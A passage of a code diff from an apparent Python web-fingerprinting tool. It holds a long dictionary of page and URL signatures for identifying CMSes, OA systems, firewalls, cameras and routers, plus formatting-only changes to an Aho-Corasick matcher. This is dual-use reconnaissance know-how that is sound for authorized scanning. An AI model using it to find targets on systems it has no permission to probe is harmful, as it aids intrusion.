"/broadWeb/bwuconfig.asp": "Advantech-WebAccess",  "service@h3c.com": "H3C公司产品", "H3C Corporation": "H3C公司产品", "icg_helpScript.js": "H3C公司产品", "McuR5-min.js": "华为 MCU", "MCUType.js": "华为 MCU", "hidden_frame.html": "HUAWEI Inner Web", "/netopen/theme/css/inFrame.css": "华为 NetOpen", "Harbin synjones electronic": "校园卡管理系统", "document.FormPostds.action=xxsearch.action": "校园卡管理系统", "/shouyeziti.css": "校园卡管理系统", "/powered-by-b2evolution-150t.gif": "b2evolution", "Powered by b2evolution": "b2evolution", "content=b2evolution": "b2evolution", "content=Web 2.0 HylaFAX": "AvantFAX", "images/avantfax-big.png": "AvantFAX", "<!-- Aurion Teal will be used as the login-time default": "Aurion", "/aurion.js": "Aurion", "Cisco Unified Wireless IP Phone": "Cisco-IP-Phone", "href=btnet.css": "BugTracker.NET", "valign=middle><a href=http://ifdefined.com/bugtrackernet.html>": "BugTracker.NET", "<div class=logo>BugTracker.NET": "BugTracker.NET", "id=logo alt=BugFree": "BugFree", "class=loginBgImage alt=BugFree": "BugFree", "name=BugUserPWD": "BugFree", "Splunk.util.normalizeBoolean": "splunk", "Powered by DrugPak": "DrugPak", "/dplimg/DPSTYLE.CSS": "DrugPak", "/css/PortfolioManager/styles_display_page.css": "DMXReady-Portfolio-Manager", "rememberme_portfoliomanager": "DMXReady-Portfolio-Manager", "content=eGroupWare": "eGroupWare", "content=eSyndiCat": "eSyndiCat", "Epiware - Project and Document Management": "Epiware", "eMeeting Dating Software": "eMeeting-Online-Dating-Software", "/_eMeetingGlobals.js": "eMeeting-Online-Dating-Software", "/images/ui/freenas-logo.png": "FreeNAS", "css/festos.css": "FestOS", "Powered by eTicket": "eTicket", "<a href=http://www.eticketsupport.com target=_blank>": "eTicket", "/eticket/eticket.css": "eTicket", "Welcome to FileVista": "FileVista", "<a href=http://www.gleamtech.com/products/filevista/web-file-manager": "FileVista", "www.google.com/talk/service/": "Google-Talk-Chatback", "Powered by Flyspray": "Flyspray", "Powered by <a href=http://hostbillapp.com": "HostBill", "<strong>HostBill": "HostBill", "/cgi-bin/cognos.cgi": "IBM-Cognos", "Cognos &#26159; International Business Machines Corp": "IBM-Cognos", "href=http://www.combodo.com/itop": "iTop", "Powered By Kayako eSupport": "Kayako-SupportSuite", "Help Desk Software By Kayako eSupport": "Kayako-SupportSuite", "id=jxt-popup-wrapper": "JXT-Consulting", "Powered by JXT Consulting": "JXT-Consulting", "fastcdn.org": "Fastly cdn", "Manage this JBoss AS Instance": "JBoss_AS", "OraLightHeaderSub": "oracle_applicaton_server", "vmsTitle>Avaya Aura&#8482;&nbsp;Utility Server": "Avaya-Aura-Utility-Server", "/webhelp/Base/Utility_toc.htm": "Avaya-Aura-Utility-Server", "Powered by DnP Firewall": "DnP Firewall", "dnp_firewall_redirect": "DnP Firewall", "Access to the web page you were trying to visit has been blocked in accordance with company policy": "PaloAlto_Firewall", "resources/images/sophos_web.ico": "Sophos Web Appliance", "url(resources/images/en/login_swa.jpg)": "Sophos Web Appliance", "/barracuda.css": "Barracuda-Spam-Firewall", "http://www.barracudanetworks.com?a=bsf_product": "Barracuda-Spam-Firewall", "name=dnp_firewall_redirect": "DnP-Firewall", "<form name=dnp_firewall": "DnP-Firewall", "js/MulPlatAPI.js": "H3C-SecBlade-FireWall", "Comcast Business Gateway": "Comcast_Business_Gateway", "splashTitleIPTelephony": "3COM NBX", "/anygate.php": "AnyGate", "wfe/asg/js/app_selector.js?t=": "Astaro-Security-Gateway", "/doc/astaro-license.txt": "Astaro-Security-Gateway", "/js/_variables_from_backend.js?t=": "Astaro-Security-Gateway", "/images/arubalogo.gif": "Aruba-Device", "Aruba Networks": "Aruba-Device", "ARRIS Group": "ARRIS-Touchstone-Router", "/arris_style.css": "ARRIS-Touchstone-Router", "content=Belkin": "Belkin-Modem", "content=Edimax": "EDIMAX", "href=iptime.css": "ipTIME-Router", "Powered by phpshe": "phpshe", "content=phpshe": "phpshe", "/app/home/skins/default/style.css": "ThinkSAAS", "reader/view_abstract.aspx": "e-tiller", "Powered by DouPHP": "DouPHP", "indexLeft": "DouPHP", "http://www.siteserver.cn": "SiteServer", "sitefiles": "SiteServer", "content=Joomla": "Joomla", "/media/system/js/mootools-core.js": "Joomla", "/ks_inc/common.js": "kesionCMS", "publish by KesionCMS": "kesionCMS", "/css/cmstop-common.css": "CMSTop", "/js/cmstop-common.js": "CMSTop", "cmstop-list-text.css": "CMSTop", "<a class=poweredby href=http://www.cmstop.com": "CMSTop", "Powered by ESPCMS": "ESPCMS", "/templates/default/style/tempates_div.css": "ESPCMS", "content=74cms.com": "74cms",  "Powered by <a href=http://www.74cms.com/": "74cms", "/templates/default/css/common.css": "74cms", "Created by DotNetCMS": "Foosun", "For Foosun": "Foosun", "Powered by www.Foosun.net,Products:Foosun Content Manage system": "Foosun", "http://www.phpcms.cn": "PhpCMS", "content=Phpcms": "PhpCMS", "Powered by Phpcms": "PhpCMS", "data/config.js": "PhpCMS", "/index.php?m=content&c=index&a=lists": "PhpCMS", "/index.php?m=content&amp;c=index&amp;a=lists": "PhpCMS", "Power by DedeCms": "DedeCMS", "http://www.dedecms.com/": "DedeCMS!!", "DedeCMS": "DedeCMS!!", "/templets/default/style/dedecms.css": "DedeCMS","content=ASPCMS": "ASPCMS", "/inc/AspCms_AdvJs.asp": "ASPCMS", "content=MetInfo": "MetInfo", "powered_by_metinfo": "MetInfo", "/images/css/metinfo.css": "MetInfo", "Publish By JCms2010": "捷点JCMS", "Powered By IdeaCMS": "IdeaCMS", "m_ctr32": "IdeaCMS",  "Telerik.Web.UI.WebResource.axd": "Telerik Sitefinity", "content=Sitefinity": "Telerik Sitefinity", "content=PageAdmin CMS": "PageAdmin", "/e/images/favicon.ico": "PageAdmin", "EnterCRM": "EnterCRM", "lan12-jingbian-hong": "易普拉格科研管理系统", "/ws2004/Public/": "苏亚星校园管理系统", "/wcm/app/js": "trs_wcm", "0;URL=/wcm": "trs_wcm", "window.location.href = /wcm;": "trs_wcm", "forum.trs.com.cn": "trs_wcm","/Widgets/WidgetCollection/": "we7", "Powered by 1024 CMS": "1024 CMS", "generator content=1024 CMS (c)": "1024cms", "360WebManager Software": "360webfacil_360WebManager", "Powered by 6kbbs": "6kbbs", "generator content=6KBBS": "6kbbs", "Start Acidcat CMS footer information": "Acidcat CMS", "Powered by Acidcat CMS": "Acidcat CMS", "bit-xxzs": "bit-service", "xmlpzs/webissue.asp": "bit-service", "main/building.cfm": "云因网上书店", "href=../css/newscomm.css": "云因网上书店", "generator content=MediaWiki": "MediaWiki", "/wiki/images/6/64/Favicon.ico": "MediaWiki", "Powered by MediaWiki": "MediaWiki", "generator content=Typecho": "Typecho", "Typecho": "Typecho", "Generator content=2z project": "2z project", "/tpl/Home/weimeng/common/css/": "微门户", "generator content=webEdition": "webEdition", "publish by BoyowCMS": "BoyowCMS", "PDV_PAGENAME": "phpweb", "labelOppInforStyle": "地平线CMS", "search_result.aspx": "地平线CMS", "maincontent.css": "HIMS酒店云计算服务",  "content=tipask": "Tipask", "userfiles/shoppics/": "微普外卖点餐系统", "script src=http://code.zoomla.cn/": "逐浪zoomla",  "/style/images/win8_symbol_140x140.png": "逐浪zoomla", "upload/moban/images/style.css": "asp168欧虎", "default.php?mod=article&do=detail&tid": "asp168欧虎", "App_Themes/1/Style.css": "擎天电子政务", "window.location = homepages/index.aspx": "擎天电子政务", "homepages/content_page.aspx": "擎天电子政务", "bigSortProduct.asp?bigid": "北京阳光环球建站系统", "MaticsoftSNS": "MaticsoftSNS_动软分享社区", "/Areas/SNS/": "MaticsoftSNS_动软分享社区", "Powered by FineCMS": "FineCMS", "dayrui@gmail.com": "FineCMS", "Copyright content=FineCMS": "FineCMS", "Powered by Diferior": "Diferior", "/deptWebsiteAction.do": "某通用型政府cms", "css/css_whir.css": "万户网络", "ycportal/webpublish": "全国烟草系统", "/index.php/clasify/showone/gtitle/": "O2OCMS", "bx_css_async": "Dolphin", "aw_template.js": "wecenter", "WeCenter": "wecenter", "Powered by PHPVOD": "phpvod", "content=phpvod": "phpvod", "content=08CMS": "08cms", "typeof(_08cms)": "08cms", "content=TUTUCMS": "tutucms", "Powered by TUTUCMS": "tutucms", "TUTUCMS": "tutucms", "content=BageCMS": "八哥CMS", "/css/mymps.css": "mymps", "content=mymps": "mymps", "content=IMGCMS": "IMGCms", "Powered by IMGCMS": "IMGCms", "content=jieqi cms": "jieqi cms", "content=eAdmin": "eadmin", "content=OpenCms": "opencms", "Powered by OpenCms": "opencms", "infoglueBox.png": "infoglue", "content=171cms": "171cms", "Power by DocCms": "doccms", "Powerd by AppCMS": "appcms", "content=NIUCMS": "niucms", "content=BAOCMS": "baocms", "/js/jtbc.js": "JTBC(CMS)", "content=JTBC": "JTBC(CMS)", "content=YiqiCMS": "易企CMS", "_ZCMS_ShowNewMessage": "ZCMS", "zcms_skin": "ZCMS", "keyicms": "科蚁CMS", "Powered by <a href=http://www.keyicms.com": "科蚁CMS", "maccms:voddaycount": "苹果CMS", "content=damicms": "大米CMS",  "Powered by Phpmps": "phpmps", "templates/phpmps/style/index.css": "phpmps", "Powered by 25yi": "25yi", "css/25yi.css": "25yi", "content=KingCMS": "kingcms", "Powered by KingCMS": "kingcms", "DianCMS_SiteName": "易点CMS",  "Powered by FengCms": "fengcms", "content=FengCms": "fengcms", "Powered By PHPB2B": "phpb2b", "Powered by PHPDisk": "phpdisk", "content=PHPDisk": "phpdisk", "Powered by <a href=http://www.edusoho.com": "EduSoho开源网络课堂", "Powered By EduSoho": "EduSoho开源网络课堂", "Powered By phpok.com": "phpok", "content=phpok": "phpok",  "BEESCMS": "beecms", "template/default/images/slides.min.jquery.js": "beecms", "content=OURPHP": "ourphp", "Powered by ourphp": "ourphp", "<div class=index_link_list_name>": "php云", "/js/jPackageCss/jPackage.css": "贷齐乐p2p", "src=/js/jPackage": "贷齐乐p2p",  "<meta name=generator content=Destoon": "destoon", "destoon_moduleid": "destoon", "/js/diyou.js": "帝友P2P", "src=/dyweb/dythemes": "帝友P2P", "Powered by SeaCms": "海洋CMS", "content=seacms": "海洋CMS", "opensns": "OpenSNS", "content=OpenSNS": "OpenSNS", "semcms PHP": "SEMcms", "sc_mid_c_left_c sc_mid_left_bt": "SEMcms", "/css/yxcms.css": "Yxcms", "content=Yxcms": "Yxcms", "NITC Web Marketing Service": "NITC", "/images/nitc1.png": "NITC", "Powered by wuzhicms": "wuzhicms", "content=wuzhicms": "wuzhicms", "phpMyWind.com All Rights Reserved": "PHPMyWind", "content=PHPMyWind": "PHPMyWind", "content=Boka SiteEngine": "SiteEngine", "content=B2Bbuilder": "b2bbuilder", "translateButtonId = B2Bbuilder": "b2bbuilder", "1207044504": "农友政务系统", "content=Dswjcms": "dswjcms", "Powered by Dswjcms": "dswjcms", "FoxPHPScroll": "FoxPHP", "FoxPHP_ImList": "FoxPHP", "content=FoxPHP": "FoxPHP", "content=WeiPHP": "weiphp", "/css/weiphp.css": "weiphp", "/jooyea/images/sns_idea1.jpg": "iWebSNS", "/jooyea/images/snslogo.gif": "iWebSNS", "Powered by TurboCMS": "TurboCMS", "/cmsapp/zxdcADD.jsp": "TurboCMS", "/cmsapp/count/newstop_index.jsp?siteid=": "TurboCMS", "content=MoMoCMS": "MoMoCMS", "Powered BY MoMoCMS": "MoMoCMS", "/css/admin_import.css": "Acidcat CMS", "<!-- /all in one seo pack -->": "WP Plugin All-in-one-SEO-Pack", "content=1024 CMS": "1024 CMS", "SpeakIntertScarch.aspx": "北京金盘鹏图软件", "content=STCMS": "STcms", "DahongY<dahongy@gmail.com>": "STcms", "SetKingoEncypt.jsp": "青果软件", "/jkingo.js": "青果软件", "content=DirCMS": "DirCMS", "content=niubicms": "牛逼cms", "/SouthidcKeFu.js": "南方数据", "CONTENT=Copyright 2003-2015 - Southidc.net": "南方数据", "/Southidcj2f.Js": "南方数据", "yidacms.css": "yidacms", "power by bcms": "bluecms", "bcms_plugin": "bluecms", ">taoCMS<": "taocms", "jqueryTiki = new Object": "Tiki-wiki CMS", "content=LEPTON-CMS": "lepton-cms", "Powered by LEPTON CMS": "lepton-cms", "UserInfo/UserFP.aspx": "euse_study", "DuomiCms": "DuomiCms", "content=Erwin Aligam - ealigam@gmail.com": "ANECMS", "content=http://www.ananyoo.com": "Ananyoo-CMS", "Powered by: Amiro CMS": "Amiro-CMS", "-= Amiro.CMS (c) =-": "Amiro-CMS", "AlumniServerProject.php": "AlumniServer", "content=Alumni": "AlumniServer", "Powered by EPay Enterprise": "AlstraSoft-EPay-Enterprise", "/shop.htm?action=view": "AlstraSoft-EPay-Enterprise", "<a href=pass_recover.php>": "AlstraSoft-AskMe", "http://www.alstrasoft.com": "AlstraSoft-AskMe", "copyright Artiphp": "Artiphp-CMS", "content=BIGACE": "BIGACE", "Site is running BIGACE": "BIGACE", "<div id=bb5-site-wrapper>": "BackBee", "Powered by Auto CMS": "Auto-CMS", "content=AutoCMS": "Auto-CMS", "content=STARCMS": "STAR CMS", "<img alt=STAR CMS": "STAR CMS", "powered by: Zotonic": "Zotonic", "/lib/js/apps/zotonic-1.0": "Zotonic", "content=bloofoxCMS": "BloofoxCMS", "Powered by <a href=http://www.bloofox.com": "BloofoxCMS", "content=bitweaver": "bitweaver", "href=http://www.bitweaver.org>Powered by": "bitweaver", "content=ClanSphere": "ClanSphere", "index.php?mod=clansphere&amp;action=about": "ClanSphere", "Powered by CitusCMS": "CitusCMS", "<strong>CitusCMS</strong>": "CitusCMS", "content=CitusCMS": "CitusCMS", "content=Webmanager-pro": "CMS-WebManager-Pro", "href=http://webmanager-pro.com>Web.Manager": "CMS-WebManager-Pro", "powered by CMSQLite": "CMSQLite", "content=www.CMSQLite.net": "CMSQLite", "Powered by CMSimple.dk": "CMSimple", "content=CMSimple": "CMSimple", "content=CMScontrol": "CMScontrol", "target=_blank>Claroline</a>": "Claroline", "http://www.claroline.net rel=Copyright": "Claroline", "Powered by <a href=http://www.netartmedia.net/carsportal": "Car-Portal", "class=bodyfontwhite><strong>&nbsp;Car Script": "Car-Portal", "powered by <a href=http://FrozenPepper.de": "chillyCMS", "Powered by Dolphin": "BoonEx-Dolphin", "<a href=http://www.boonex.com/products/dolphin": "BoonEx-Dolphin", "content=SilverStripe": "SilverStripe", "content=Campsite": "Campsite", "Powered by <a href=http://www.ischoolsite.com": "ischoolsite", "/CafeEngine/style.css": "CafeEngine", "<a href=http://cafeengine.com>CafeEngine.com": "CafeEngine", "Powered by BrowserCMS": "BrowserCMS", "content=BrowserCMS": "BrowserCMS", "powered by Contrexx": "Contrexx-CMS", "content=Contrexx": "Contrexx-CMS", "content=contentXXL": "ContentXXL", "content=Esselbach Contentteller CMS": "Contentteller-CMS", "system/contao.css": "Contao", "content=CommonSpot": "CommonSpot", "Created by CruxCMS": "CruxCMS", "href=/Writable/ClientImages/mycss.css": "锐商企业CMS", "content=coWiki": "coWiki", "<!-- Generated by coWiki": "coWiki", "<!--Coppermine Photo Gallery": "Coppermine", "content=DaDaBIK": "DaDaBIK", "class=powered_by_dadabik": "DaDaBIK", "content=CustomCMS": "Custom-CMS", "content=DT Centrepiece": "DT-Centrepiece", "Powered By DT Centrepiece": "DT-Centrepiece", "content=edito": "Edito-CMS", "powered by echo": "Echo", "/Echo2/echoweb/login": "Echo", "content=ECOMAT CMS": "Ecomat-CMS", "powered by eazyCMS": "EazyCMS", "<a class=actionlink href=http://www.eazyCMS.com": "EazyCMS", "content=easyLink": "easyLink-Web-Solutions", "Powered by EasyConsole CMS": "EasyConsole-CMS", "Powered by <a href=http://www.easyconsole.com": "EasyConsole-CMS", "/dotAsset/": "DotCMS", "/index.dot": "DotCMS", "powered by DBHcms": "DBHcms", "/donationscloud.css": "Donations-Cloud", "href=http://www.dokeos.com rel=Copyright": "Dokeos", "content=Dokeos": "Dokeos", "name=Generator content=Dokeos": "Dokeos", "content=Elxis": "Elxis-CMS", "<a href = http://www.efrontlearning.net": "eFront", "eSitesBuilder. All rights reserved": "eSitesBuilder", "content=EPiServer": "EPiServer", "/javascript/episerverscriptmanager.js": "EPiServer", "scripts/Energine.js": "Energine", "Powered by <a href= http://energine.org/": "Energine", "stylesheets/energine.css": "Energine", "/gallery/images/gallery.png": "Gallery", "target=_blank>Frog CMS": "FrogCMS", "href=http://www.madebyfrog.com>Frog CMS": "FrogCMS", "<a href=http://fossil-scm.org": "Fossil", "content=Ryan Haudenschilt": "FCMS", "Powered by Family Connections": "FCMS", "content=fastpublish": "Fastpublish-CMS", "Powered by <a href=http://compmaster.prv.pl": "F3Site", "content=Exponent Content Management System": "Exponent-CMS", "Powered by Exponent CMS": "Exponent-CMS", "Powered by E-Xoopport": "E-Xoopport", "content=E-Xoopport": "E-Xoopport", "E-Manage All Rights Reserved MySchool Version": "E-Manage-MySchool", "by <a href=http://www.glfusion.org/": "glFusion", "content=GetSimple": "GetSimple", "Powered by GetSimple": "GetSimple", "hesk_javascript.js": "HESK", "hesk_style.css": "HESK", "Powered by <a href=http://www.hesk.com": "HESK", "Powered by <a href=https://www.hesk.com": "HESK", "content=GuppY": "GuppY", "class=copyright href=http://www.freeguppy.org/": "GuppY", "content=Fluent": "FluentNET", "Powered By <a href=http://www.geeklog.net/": "GeekLog", "content=Hycus": "Hycus-CMS", "Powered By <a href=http://www.hycus.com": "Hycus-CMS", "content=Hotaru": "Hotaru-CMS", "Powered by HoloCMS": "HoloCMS", "content=ImpressPages CMS": "ImpressPages-CMS", "include/xoops.js": "xoops", "content=Intraxxion": "Intraxxion-CMS", "<!-- site built by Intraxxion": "Intraxxion-CMS", "content=InterRed": "InterRed", "Created with InterRed": "InterRed", "content=Informatics": "Informatics-CMS", "href=http://www.jagoanstore.com/ target=_blank>Toko Online": "JagoanStore", "content=Kandidat-CMS": "Kandidat-CMS", "content=Kajona": "Kajona", "powered by Kajona": "Kajona", "Powered by <b>JGS-Portal Version": "JGS-Portal", "href=jgs_portal_box.php?id=": "JGS-Portal", "JCORE_VERSION = ": "jCore", "Sorry,you need to use IE brower": "techbridge", "x-value=On-Net Surveillance Systems Inc.": "OnSSI_Video_Clients", "IP Surveillance for Your Life": "eagleeyescctv", "/nobody/loginDevice.js": "eagleeyescctv", "clear_cookie(login);": "dasannetworks", "/viewer/live/en/live.html": "佳能网络摄像头(Canon Network Cameras)", "objLvrForNoIE": "NetDvrV3", "inquiry.cgi?inqjs=system&inqjs=camera": "sony摄像头", "eParamID_SWVersion": "AJA-Video-Converter", "ACTi Corporation All Rights Reserved": "ACTi", "Powered by Vicworl": "Vicworl", "content=Vicworl": "Vicworl", "vindex_right_d": "Vicworl", "filename=AVCON6Setup.exe": "AVCON6", "language_dispose.action": "AVCON6", "/incl/trash.shtml": "Axis-Network-Camera", "MultiCameraFrame?Mode=Motion&Language": "Panasonic Network Camera", "/cgi-bin/client_execute.cgi?tUD=0": "BlueNet-Video", "content=ClipBucket": "ClipBucket", "<!-- ClipBucket": "ClipBucket", "<!-- Forged by ClipBucket": "ClipBucket", "href=http://clip-bucket.com/>ClipBucket": "ClipBucket", "ZoneMinder Login": "ZoneMinder", "259F9FDF-97EA-4C59-B957-5160CAB6884E": "DVR-WebClient", "DCS-950G.toLowerCase()": "D-Link-Network-Camera", "style/bovisnt.css": "DiBos", "value=evocam.jar": "Evo-Cam", "<applet archive=evocam.jar": "Evo-Cam", "Copyright &copy;  INTELLINET NETWORK SOLUTIONS": "Intellinet-IP-Camera", "http://www.intellinet-network.com/driver/NetCam.exe": "Intellinet-IP-Camera", "content=Brian Lau, IQinVision": "IQeye-Netcam", "loc = iqeyevid.html": "IQeye-Netcam", "content=phpwind": "phpwind", "content=Discuz": "discuz", "portal.php?mod=view": "discuz", "Powered by <strong><a href=http://www.discuz.net": "discuz", "ipb.vars": "IP.Board", "Powered By ThinkOX": "ThinkOX", "<!-- If you like showing off the fact that your server rocks -->": "bbPress", "is proudly powered by <a href=http://bbpress.org": "bbPress", "pics/blogengine.ico": "BlogEngine_NET", "http://www.dotnetblogengine.net": "BlogEngine_NET", "powered by boastMachine": "boastMachine", "Powered by <a href=http://boastology.com": "boastMachine", "developed by <a href=http://www.zkdigital.com": "BrewBlogger", "Powered by <a href=http://dotclear.org/": "Dotclear", "powered by DokuWiki": "DokuWiki", "content=DokuWiki": "DokuWiki", "<div id=dokuwiki": "DokuWiki", "content=powered by DeluxeBB": "DeluxeBB", "generated by esoTalk": "esoTalk", "Powered by esoTalk": "esoTalk", "/js/esotalk.js": "esoTalk", "content=Hiki": "Hiki", "/hiki_base.css": "Hiki", "by <a href=http://hikiwiki.org/": "Hiki", "href=gforum.cgi?username=": "Gossamer-Forum", "Powered by <a href=http://fluxbb.org/": "FluxBB", "http://cf.kampyle.com/k_button.js": "Kampyle", "Start Kampyle Feedback Form Button": "Kampyle", "Powered by KaiBB": "KaiBB", "content=Forum powered by KaiBB": "KaiBB", "/fangmail/default/css/em_css.css": "fangmail", "/WorldClient.dll?View=Main": "MDaemon", "Powered by TurboMail": "TurboMail", "wzcon1 clearfix": "TurboMail", "static.mxhichina.com/images/favicon.ico": "万网企业云邮箱", "iwaredir.nsf": "Lotus", "/wm/mail/login.html": "mirapoint", "<BODY LINK=White VLINK=White ALINK=White>": "U-Mail", "/cgi-bin/spammark?empty=1": "Spammark邮件信息安全网关", "/systemfunction.pack.js": "科信邮件系统", "lo_computername": "科信邮件系统", "WinWebMail Server": "winwebmail", "images/owin.css": "winwebmail", "content=Tmailer": "泰信TMailer邮件系统", "href=/tmailer/img/logo/favicon.ico": "泰信TMailer邮件系统", "/resource/se/lang/se/mail_zh_CN.js": "richmail", "content=Richmail": "richmail", "Copyright by<A HREF=http://www.igenus.org": "iGENUS邮件系统", "/jdwm/cgi/login.cgi?login": "金笛邮件系统", "/aboutus/magicmail.gif": "迈捷邮件系统(MagicMail)", "Powered by Atmail": "Atmail-WebMail", "/index.php/mail/auth/processlogin": "Atmail-WebMail", "<input id=Mailserverinput": "Atmail-WebMail", "/FormMail.pl": "FormMail", "href=http://www.worldwidemart.com/scripts/formmail.shtml": "FormMail", "style_chaoshi": "同城多用户商城", "/runtime/default/systemjs": "iWebShop", "/shop/catalog/browse?sessid=": "1und1", "skins/_common/jscripts.css": "cart_engine", "/skin/frontend/": "Magento", "Magento, Varien, E-commerce": "Magento", "Powered By OpenCart": "OpenCart", "catalog/view/theme": "OpenCart", "hishop.plugins.openid": "hishop", "Hishop development team": "hishop", "Maticsoft Shop": "Maticsoft_Shop_动软商城", "/Areas/Shop/": "Maticsoft_Shop_动软商城", "/media/com_hikashop/css/": "hikashop", "mn-c-top": "tp-shop", "haidao.web.general.js": " 海盗云商(Haidao)", "content=ShopBuilder": "shopbuilder", "Powered by ShopBuilder": "shopbuilder", "ShopBuilder": "shopbuilder", "content=V5shop": "v5shop", "Powered by V5Shop": "v5shop", "Powered by ShopNC": "shopnc", "Copyright 2007-2014 ShopNC Inc": "shopnc", "content=ShopNC": "shopnc", "content=ShopEx": "shopex", "@author litie[aita]shopex.cn": "shopex", "content=dbshop": "dbshop", "content=366EC": "任我行电商", "Power by CuuMall": "CuuMall", "content=JavaShop": "javashop", "/index.php/Mobile/Index/index.html": "TPshop",  "content=MvMmall": "MvMmall", "E-Commerce Shopping Cart Software": "AirvaeCommerce", "APP_authenticate": "AiCart", "content=MallBuilder": "MallBuilder", "Powered by MallBuilder": "MallBuilder", "function EJEJC_lc": "e-junkie", "content=Allomani": "Allomani", "Programmed By Allomani": "Allomani", "content=Pilot Cart": "ASPilot-Cart", "/pilot_css_default.css": "ASPilot-Cart", "content=Axous": "Axous", "Powered by CaupoShop": "CaupoShop-Classic", "<!-- CaupoShop Classic": "CaupoShop-Classic", "<a href=http://www.caupo.net target=_blank>CaupoNet": "CaupoShop-Classic", "content=PrestaShop": "PretsaShop", "CONTENT=Powered by Comersus": "ComersusCart", "href=comersus_showCart.asp": "ComersusCart", "<script src=//cdn.foxycart.com": "Foxycart", "class=KT_tngtable": "DV-Cart", "fpassword.asp?redirectUrl=&frURL=Custva.asp": "EarlyImpact-ProductCart", "content=Escenic": "Escenic", "<!-- Start Escenic Analysis Engine client script -->": "Escenic", "Powered by ICEshop": "ICEshop", "<div id=iceshop>": "ICEshop", "content=Interspire Shopping Cart": "Interspire-Shopping-Cart", "class=PoweredBy>Interspire Shopping Cart": "Interspire-Shopping-Cart", "Powered by <a href=http://iscripts.com/multicart": "iScripts-MultiCart", "/OAapp/WebObjects/OAapp.woa": "华天动力OA(OA8000)", "<link rel=shortcut icon href=/images/tongda.ico />": "通达OA!!",  "Office Anywhere 2013": "通达OA!!", "/seeyon/USER-DATA/IMAGES/LOGIN/login.gif": "用友致远oa", "V_hedden": "yongyoufe", "admin_img/msg_bg.png": "PHPOA", "/resource/javascript/system/runtime.min.js": "78oa", "license.78oa.com": "78oa", "src=/module/index.php": "78oa", "WishOA_WebPlugin.js": "WishOA", "ecwapoa": "ecwapoa", "EZOFFICEUSERNAME": "ezOFFICE", "whirRootPath": "ezOFFICE", "/defaultroot/js/cookie.js": "ezOFFICE", "CRM_LASTLOGINUSERKEY": "任我行CRM", "http://www.xdoa.cn</a>": "信达OA", "admin@cnoa.cn": "协众OA", "Powered by CNOA.CN": "协众OA", "HTVOS.js": "海天OA", "/js/jquery/jquery_wev8.js": "泛微OA", "/login/Login.jsp?logintype=1": "泛微OA", "/app_qjuserinfo/qjuserinfoadd.jsp": "中望OA", "/IMAGES/default/first/xtoa_logo.png": "中望OA", "/studentSign/toLogin.di": "睿博士云办公系统", "/user/toUpdatePasswordPage.di": "睿博士云办公系统", "/yimioa.apk": "一米OA", "/dwr/interface/LoginService.js": "泛普建筑工程施工OA", "zfoausername": "正方OA", "/heeroa/login.do": "希尔OA", "/yyoa/": "用友致远oa", "/seeyon/common/all-min.js": "用友致远oa", "/wp-login.php?": "WordPress", "wp-user": "WordPress", "https://www.bt.cn/bbs/thread-18367-1-1.html": "宝塔面板", "/admin_ui/rdx/core/css/safari.png": "Citrix","JumpServer": "JumpServer!!", "SaltStack": "SaltStack", "/cgi/maincgi.cgi": "天融信防火墙", "content=\"0;URL='/ui'\"/>": "ESXI!!", "Dell Laser Printer": "Dell-Printer", "WAMPSERVER": "wamp", "Huawei HG520": "Huawei HG520 ADSL2+ Router", "OPZOON - ": "汉柏安全网关", "<div id=\"copyright\">Powered by vBulletin": "vBulletin", "<!-- START headerTags\\.cfm": "Adobe ColdFusion"}
         self.cfin = {"中企动力提供技术支持": "中企动力门户CMS","您访问的是主机宝服务器默认页": "主机宝", "小米路由器": "小米路由器", "护卫神": "护卫神网站安全系统","天融信日志收集与分析系统": "天融信日志收集与分析系统", "汉码软件": "汉码软件", "凡科互联网科技股份有限公司": "凡科", "凡科": "凡科", "智睿软件": "智睿软件", "北京久其软件股份有限公司": "久其通用财表系统", "科来软件 版权所有": "科来RAS", "福富软件": "福富安全基线管理", "北京清元优软科技有限公司": "URP教务系统", "科研管理系统，北京易普拉格科技": "易普拉格科研管理系统","微普外卖点餐系统": "微普外卖点餐系统", "研发与技术支持：武汉弘智科技有限公司": "武汉弘智科技", "沃科网": "沃科网异网同显系统", "北京创信达科技有限公司": "信达OA", "安全入口校验失败": "宝塔面板"}
         self.total = 0
-        self.ctotal = 0 # Chinses counter
+        self.ctotal = 0  # Chinses counter
         self.dic = {}
         self.length = 1000
         self.clength = 1000
@@ -5342,9 +5605,9 @@ class Fingerident:
                     self.trie[u].child[ids] = self.total
                 u = self.trie[u].child[ids]
                 if u >= self.length:
-                    for i in range(int(self.length*1.5) - u):
+                    for i in range(int(self.length * 1.5) - u):
                         self.trie.append(FingerStruct())
-                    self.length = int(self.length*1.5) 
+                    self.length = int(self.length * 1.5)
             self.trie[u].exist.append(len(key_word))
 
         # build trie
@@ -5357,11 +5620,12 @@ class Fingerident:
             q.pop(0)
             for i in range(91):
                 if self.trie[u].child[i]:
-                    self.trie[self.trie[u].child[i]].fail = self.trie[self.trie[u].fail].child[i]
+                    self.trie[self.trie[u].child[i]].fail = self.trie[
+                        self.trie[u].fail
+                    ].child[i]
                     q.append(self.trie[u].child[i])
                 else:
                     self.trie[u].child[i] = self.trie[self.trie[u].fail].child[i]
-
 
     def build_Chinses_trie(self):
 
@@ -5388,9 +5652,9 @@ class Fingerident:
 
                 u = self.ctrie[u].child[ids]
                 if u >= self.clength:
-                    for i in range(int(self.clength*1.5) - u):
+                    for i in range(int(self.clength * 1.5) - u):
                         self.ctrie.append(CFingerStruct())
-                    self.clength = int(self.clength *1.5)
+                    self.clength = int(self.clength * 1.5)
             self.ctrie[u].exist.append(len(key_word))
 
         # Build Chinses trie
@@ -5398,19 +5662,19 @@ class Fingerident:
         q = []
         for i in range(self.clength):
             if self.ctrie[0].child[i]:
-                q.append(self.ctrie[0].child[i]) 
+                q.append(self.ctrie[0].child[i])
 
         while q:
             u = q[0]
             q.pop(0)
             for i in range(self.clength):
                 if self.ctrie[u].child[i]:
-                    self.ctrie[self.ctrie[u].child[i]].fail = self.ctrie[self.ctrie[u].fail].child[i]
+                    self.ctrie[self.ctrie[u].child[i]].fail = self.ctrie[
+                        self.ctrie[u].fail
+                    ].child[i]
                     q.append(self.ctrie[u].child[i])
                 else:
                     self.ctrie[u].child[i] = self.ctrie[self.ctrie[u].fail].child[i]
-
-
 
     def query(self, strs):
         u = 0
@@ -5421,7 +5685,7 @@ class Fingerident:
                 j = u = self.trie[u].child[ord(c) - ord(" ")]
                 while j and self.trie[j].exist:
                     for k in self.trie[j].exist:
-                        res.append(strs[i - k  + 1: i + 1])
+                        res.append(strs[i - k + 1 : i + 1])
                     j = self.trie[j].fail
 
         return self.identification(res)
@@ -5436,11 +5700,10 @@ class Fingerident:
